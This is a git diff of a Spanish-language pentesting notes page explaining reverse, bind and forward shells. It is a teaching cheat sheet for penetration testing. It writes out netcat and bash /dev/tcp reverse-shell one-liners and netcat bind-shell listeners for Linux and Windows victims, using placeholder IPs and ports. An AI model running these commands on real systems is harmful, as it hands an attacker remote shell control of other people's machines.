@@ -1,10 +1,12 @@
 # Shells
 
-## Reverse Shell
+## Tipos de Shell
+
+### Reverse Shell
 
 <figure><img src="../../.gitbook/assets/image (10) (1) (3).png" alt=""><figcaption><p>Target to Attacker</p></figcaption></figure>
 
-### Atacante Linux
+#### Atacante Linux
 
 {% code overflow="wrap" %}
 ```bash
@@ -19,33 +21,36 @@ Donde:
 * `-n` : Deshabilitar resolución inversa de DNS
 * `-p <Port>` : Establece el puerto de escucha
 
-### Victima Linux
+#### Victima Linux
 
 ```bash
-nc <IP> <Port> -e /bin/bash
+nc -e /bin/bash <IP> <Port>
+
+# Bash
+bash -i >& /dev/tcp/<IP>/<Port> 0>&1
 ```
 
-### Víctima Windows
+#### Víctima Windows
 
 ```bash
-nc.exe <IP> <Port> –e cmd.exe
+nc.exe –e cmd.exe <IP> <Port>
 ```
 
 
 
-## Bind Shell
+### Bind Shell
 
 En algunos proyectos donde no puedas establecer un servidor de escucha por que te encuentres por NAT o por Firewall, a veces es conveniente de que la máquina victima esté en modo escucha ofreciendo la shell, a esto se le llama <mark style="color:green;">**Bind shell**</mark> o <mark style="color:green;">**shell directa.**</mark>
 
 <figure><img src="../../.gitbook/assets/image (26) (2).png" alt=""><figcaption></figcaption></figure>
 
-### Atacante Linux
+#### Atacante Linux
 
 ```bash
 nc <IP Target> <Port>
 ```
 
-### Víctima Linux
+#### Víctima Linux
 
 {% code overflow="wrap" %}
 ```bash
@@ -53,7 +58,7 @@ nc -lvnp <Port> -e /bin/bash
 ```
 {% endcode %}
 
-### Víctima Windows
+#### Víctima Windows
 
 {% code overflow="wrap" %}
 ```bash
@@ -61,9 +66,11 @@ nc.exe -l -p <Port> -e cmd.exe
 ```
 {% endcode %}
 
-## Forward Shell
+### Forward Shell
 
 Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota.
+
+
 
 Puedes encontrar casos en los que tienes un RCE (Remote Code Execution) en una aplicación web en una máquina Linux pero debido a reglas Iptables u otro tipo de filtrado no puedes obtener una shell inversa.&#x20;
 
@@ -77,8 +84,10 @@ Sólo necesitas modificar La URL del host vulnerable El prefijo y sufijo de tu p
 
 ## Referencias
 
-Generador de Revershells
+
 
 {% embed url="https://www.revshells.com/" %}
+Generador de Revershells
+{% endembed %}
 
 {% embed url="https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/" %}
